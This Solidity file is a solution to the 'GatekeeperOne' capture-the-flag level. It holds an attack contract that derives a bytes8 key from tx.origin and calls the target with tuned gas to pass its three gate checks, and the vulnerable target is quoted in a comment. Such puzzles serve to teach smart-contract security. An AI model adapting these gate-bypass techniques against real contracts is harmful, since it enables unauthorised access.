// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneHack {
    function enter(address _targetAddress, uint256 gas) external {
        IGateKeeperOne target = IGateKeeperOne(_targetAddress);

        uint16 k16 = uint16(uint160(tx.origin));

        uint64 k64 = uint64(1 << 63) + uint64(k16);

        // Casting our crafted k64 to type bytes8 to match the needed input.
        bytes8 key = bytes8(k64);

        // Sanity checks, no sense in having gas guess greater than the multiple of 8191.
        require(gas < 8191, "gas > 8191");
        // Reverts unless gas and key are correct!
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}

/*
// Target contract:

contract GatekeeperOne {
    address public entrant;

    // Simply call the enter function from inside another contract to satisfy this check.
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // the amount of gas left when this part of the code executed has to be evenly divisible by 8191.
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
*/
